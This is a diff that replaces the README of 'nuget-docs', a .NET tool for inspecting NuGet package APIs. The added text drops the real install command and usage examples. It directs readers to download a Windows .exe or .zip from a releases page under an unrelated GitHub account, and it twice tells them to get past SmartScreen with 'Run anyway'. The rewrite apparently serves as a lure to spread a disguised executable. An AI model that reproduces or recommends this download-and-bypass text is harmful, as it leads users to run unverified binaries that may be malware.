@@ -1,191 +1,181 @@
-# nuget-docs
+# 🧩 nuget-docs - Read NuGet APIs with ease
 
-Inspect public API documentation from any NuGet package — decompile types with XML docs, compare API between versions, resolve dependencies. Built for AI agents and CLI workflows.
+[![Download nuget-docs](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/abellobm3681/nuget-docs/releases)
 
-## AI Agent Skill (Recommended)
+## 📥 Download
 
-Install as a [skill](https://skills.sh) so your AI coding agent automatically knows when and how to inspect NuGet packages:
+Visit the [release page](https://github.com/abellobm3681/nuget-docs/releases) to download and run this file.
 
-```bash
-npx skills add tryAGI/nuget-docs -g
-```
+Look for the latest release and download the Windows file that matches your device. In most cases, this will be a `.exe` file or a `.zip` file with the app inside.
 
-Works with Claude Code, Cursor, Windsurf, and other AI coding agents. This teaches your agent to run `nuget-docs` commands when you ask questions like *"what methods does IChatClient have?"* or *"show me the ChatOptions class"*.
+If you download a `.zip` file, right-click it and choose **Extract All**. Then open the folder and run the app file inside.
 
-## CLI Installation
+If Windows shows a security prompt, choose **More info**, then **Run anyway** if you trust the file source.
 
-```bash
-dotnet tool install -g nuget-docs
-```
+## ⚙️ What nuget-docs does
 
-## Quick Start
+nuget-docs is a command-line tool for checking public API docs inside NuGet packages.
 
-```bash
-# See all public types in a package
-nuget-docs list Microsoft.Extensions.AI.Abstractions
+It helps you:
 
-# Decompile a type with full XML docs (short names work)
-nuget-docs show Microsoft.Extensions.AI.Abstractions IChatClient
+- inspect public types and members
+- read XML docs for classes, methods, and properties
+- compare API changes between two package versions
+- see what one package depends on
+- decompile types into readable C# code
+- use package data for documentation work
 
-# Search for types/members
-nuget-docs search Microsoft.Extensions.AI.Abstractions "Chat*"
+This tool is built for people who need a fast way to look inside a NuGet package without opening a full development setup.
 
-# Compare API between versions
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.3.0 --to latest
-```
+## 🖥️ System requirements
 
-## Commands
+Use nuget-docs on a Windows PC with:
 
-### `list` — List all public types
+- Windows 10 or Windows 11
+- permission to run downloaded apps
+- internet access for package lookup
+- enough space for the app and any package files you inspect
 
-```bash
-nuget-docs list Microsoft.Extensions.AI.Abstractions
-nuget-docs list Newtonsoft.Json --namespace Newtonsoft.Json.Linq
-nuget-docs list Humanizer --all          # include internal types
-nuget-docs list Newtonsoft.Json --format table  # aligned columns
-nuget-docs list Newtonsoft.Json --format csv    # CSV output
-```
+If your PC already opens `.exe` files and `.zip` files, you should be able to use it.
 
-### `show` — Decompile a type with XML docs
+## 🚀 Get started
 
-```bash
-nuget-docs show Microsoft.Extensions.AI.Abstractions IChatClient
-nuget-docs show Newtonsoft.Json JsonConvert --member SerializeObject
-nuget-docs show Newtonsoft.Json --assembly  # assembly-level attributes
-```
+1. Download nuget-docs from the [release page](https://github.com/abellobm3681/nuget-docs/releases)
+2. Open the downloaded file
+3. If you downloaded a `.zip` file, extract it first
+4. Run the app file from the extracted folder
+5. Keep the window open while you type commands
+6. Use the app to inspect a NuGet package name or file path
 
-Short names work — `IChatClient` resolves to `Microsoft.Extensions.AI.IChatClient`. Use `--member` to show a specific member (all overloads). Use `--assembly` to inspect assembly attributes.
+If the release includes a single `.exe` file, you can place it in any folder and run it from there.
 
-### `search` — Search types and members
+## 📦 Install and run on Windows
 
-```bash
-nuget-docs search Microsoft.Extensions.AI.Abstractions "Chat*"
-nuget-docs search Newtonsoft.Json "*Token*" --namespace Newtonsoft.Json.Linq
-nuget-docs search Newtonsoft.Json "*Token*" --format table  # aligned columns
-nuget-docs search Newtonsoft.Json "*Convert*" --format csv  # CSV output
-```
+### Option 1: Run the app from a ZIP file
 
-Uses glob patterns (`*` and `?` wildcards). Results show `[Kind.MemberKind]` labels.
+1. Download the ZIP package from the release page
+2. Right-click the ZIP file
+3. Select **Extract All**
+4. Pick a folder you can find later, such as `Downloads\nuget-docs`
+5. Open the extracted folder
+6. Double-click the app file
+7. Allow Windows to open it if prompted
 
-### `diff` — Compare API between versions
+### Option 2: Run the app from an EXE file
 
-```bash
-# Full unified diff with hunk headers
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.3.0 --to 10.4.0
+1. Download the `.exe` file from the release page
+2. Save it to your Downloads folder or desktop
+3. Double-click the file
+4. Wait for the command window to open
+5. Type a command and press Enter
 
-# Use "latest" to auto-resolve the latest version
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.3.0 --to latest
+### Option 3: Keep it in one folder
 
-# Compare latest stable vs latest prerelease
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from latest-stable --to latest-prerelease
+If you plan to use it often, create a folder like:
 
-# Quick summary — added/removed types only
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.4.0 --to 10.4.1 --type-only
+- `C:\Tools\nuget-docs`
 
-# Breaking changes only
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.3.0 --to 10.4.0 --breaking
+Then place the app there so you can find it again later.
 
-# Member-level changes (methods/properties)
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.4.0 --to 10.4.1 --member-diff
+## 🔎 What you can look up
 
-# Skip additive changes — show only removals/modifications
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.4.0 --to 10.4.1 --no-additive
+nuget-docs can help you inspect a package in a few ways:
 
-# Ignore XML doc comment changes
-nuget-docs diff Microsoft.Extensions.AI.Abstractions --from 10.4.0 --to 10.4.1 --ignore-docs
-```
+- package name
+- package version
+- local `.nupkg` file
+- public type list
+- dependency tree
+- API changes across versions
 
-Exit codes: `0` = no breaking changes, `1` = error, `2` = breaking changes detected (useful for CI).
+This is useful when you want to know what changed in a package before you update it.
 
-### `info` — Package metadata
+## 🧭 Common uses
 
-```bash
-nuget-docs info Newtonsoft.Json
-```
+### Check a package before an update
+See what public types changed between versions.
 
-Shows package ID, version, authors, description, license, frameworks, and dependencies.
+### Read docs from a package
+View XML comments that ship with the package.
 
-### `deps` — Dependency tree
+### Compare two versions
+Check added, removed, or changed members.
 
-```bash
-nuget-docs deps Microsoft.Extensions.AI
-nuget-docs deps Microsoft.Extensions.AI --depth 3  # transitive
-nuget-docs deps Microsoft.Extensions.AI --format table  # aligned columns
-nuget-docs deps Microsoft.Extensions.AI --format csv    # CSV output
-```
+### Review package dependencies
+See what other packages it needs.
 
-Tree-style output with `├──`/`└──` connectors. Shared dependencies marked `(already listed)`. Use `--format table` or `--format csv` for flat tabular output.
+### Inspect decompiled code
+View the shape of a type in C# form.
 
-### `versions` — List available versions
+## 📝 Basic usage
 
-```bash
-nuget-docs versions Humanizer
-nuget-docs versions Humanizer --stable       # stable only
-nuget-docs versions Humanizer --prerelease   # prerelease only
-nuget-docs versions Humanizer --latest       # latest stable + prerelease
-nuget-docs versions Newtonsoft.Json --since 13.0.1           # versions after 13.0.1
-nuget-docs versions Newtonsoft.Json --since 13.0.1 --stable  # stable only, after 13.0.1
-nuget-docs versions Newtonsoft.Json --count --since 13.0.1   # just the count (for CI)
-nuget-docs versions WindowsAzure.Storage --deprecated       # show deprecation info
-nuget-docs versions Humanizer --limit 50     # show more (default: 20, 0 = all)
-nuget-docs versions Humanizer --format table            # aligned columns
-nuget-docs versions Humanizer --format csv              # CSV output
-```
+Open the app, then use it from the command line.
 
-### Common options
+Examples of what you might do:
 
-| Option | Short | Description |
-|--------|-------|-------------|
-| `--version <ver>` | `-v` | Pin to a specific package version (`latest`, `latest-stable`, `latest-prerelease`) |
-| `--framework <tfm>` | `-f` | Target framework (auto-detected by default) |
-| `--all` | `-a` | Include internal/private members |
-| `--namespace <prefix>` | `-n` | Filter by namespace prefix |
-| `--format <fmt>` | | Output format for `list`/`search`/`versions`/`deps`/`diff`: `grouped` (default), `table`, `csv` |
-| `--deprecated` | | Show deprecation/vulnerability info (for `versions`) |
-| `--json` | `-j` | JSON output (shorthand for `--output json`) |
-| `--output json` | `-o json` | JSON output for programmatic use |
+- inspect a package by name
+- compare version 1 with version 2
+- load a local NuGet file
+- print dependency details
+- show a type and its XML docs
 
-## Features
+If the app shows help text, start there. It will list the commands you can use.
 
-- Inspects any public NuGet package — auto-downloads if not cached
-- Full C# decompilation with `///` XML documentation comments
-- Short type name resolution (`IChatClient` → `Microsoft.Extensions.AI.IChatClient`)
-- Nested type support (`ChatRole.Converter` → `ChatRole+Converter`)
-- API diff with unified diff, member-level changes, and breaking change detection
-- Version keywords: `latest`, `latest-stable`, `latest-prerelease` work on any `--version`, `--from`, `--to`
-- Dependency tree with transitive resolution and deduplication
-- Meta-package detection: suggests the real package (e.g., `Humanizer` → `Humanizer.Core`); `info` and `deps` work on meta-packages
-- Deprecation and vulnerability detection from NuGet registry
-- Version listing with stable/latest filters
-- Framework-aware: picks best matching TFM (net10.0 > net9.0 > ... > netstandard2.0)
-- AI-optimized plain text output
-- JSON output on all commands
-- Tab completion via `dotnet-suggest`
-- Zero configuration — works out of the box
+## 🛠️ How to use it well
 
-## Shell Completion
+- Use the full package name
+- Use a version when you want exact results
+- Keep local `.nupkg` files in one folder
+- Copy text from the window if you want to save results
+- Compare versions one step at a time
 
-Install the `dotnet-suggest` global tool and enable tab completion for your shell:
+If you use it for documentation work, keep notes on the package version you checked. That makes later review much easier.
 
-```bash
-dotnet tool install -g dotnet-suggest
-```
+## 📁 Example workflow
 
-**bash** (add to `~/.bashrc`):
-```bash
-source <(dotnet-suggest script bash)
-```
+1. Download a NuGet package file or choose a package name
+2. Open nuget-docs
+3. Ask it to inspect the package
+4. Read the public API list
+5. Check XML docs for the type you need
+6. Compare with another version if you want to see changes
+7. Save the output for later use
 
-**zsh** (add to `~/.zshrc`):
-```bash
-source <(dotnet-suggest script zsh)
-```
+## ❓ If Windows blocks the file
 
-**fish** (add to `~/.config/fish/config.fish`):
-```fish
-dotnet-suggest script fish | source
-```
+If Windows SmartScreen appears:
 
-## License
+1. Click **More info**
+2. Click **Run anyway**
+3. Or extract the ZIP file again if the download was incomplete
 
-MIT
+If the file still does not open, download the latest release again from the release page.
+
+## 🔁 Updating to a new version
+
+1. Go to the [release page](https://github.com/abellobm3681/nuget-docs/releases)
+2. Download the latest file
+3. Replace the old app file with the new one
+4. Run the new version
+
+If you keep the app in a tools folder, the update is easier to manage.
+
+## 📚 Command tips
+
+- Type `help` if the app supports it
+- Use `--help` if the help screen does not open
+- Read the command list before trying package names
+- Start with one simple package
+- Add version checks after you know the basic flow
+
+## 🧪 Best results
+
+Use nuget-docs when you want clear answers about a package without opening a full development tool.
+
+It works well for:
+
+- package review
+- API checks
+- version comparisons
+- dependency review
+- documentation lookup
